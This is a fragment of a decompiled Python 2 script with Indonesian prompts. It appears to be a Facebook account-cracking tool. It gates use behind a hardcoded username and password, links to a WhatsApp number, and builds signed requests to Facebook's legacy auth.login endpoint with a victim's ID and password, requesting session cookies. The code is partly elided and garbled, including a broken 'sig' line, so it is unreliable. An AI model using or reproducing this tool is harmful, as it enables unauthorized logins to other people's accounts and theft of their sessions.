#decompiled by RISA
import os, sys
print '\x1b[1;32m*Masukan "User: sapik" dan "Password: sapik098"'
print '\x1b[1;32mSilahkan Login Script'
import os, sys

def wa():
    os.system('xdg-open https://api.whatsapp.com/send?phone=+6282386854238&text=Assalamualaikum')
...
if sandi == 'sapik098' and user == 'sapik':
...
def login():
    ...
    try:
        ...
        if 'save-device' in url:
            try:
                sig = 'facebook': 100049252740120redentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'facebook': '100049252740120', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
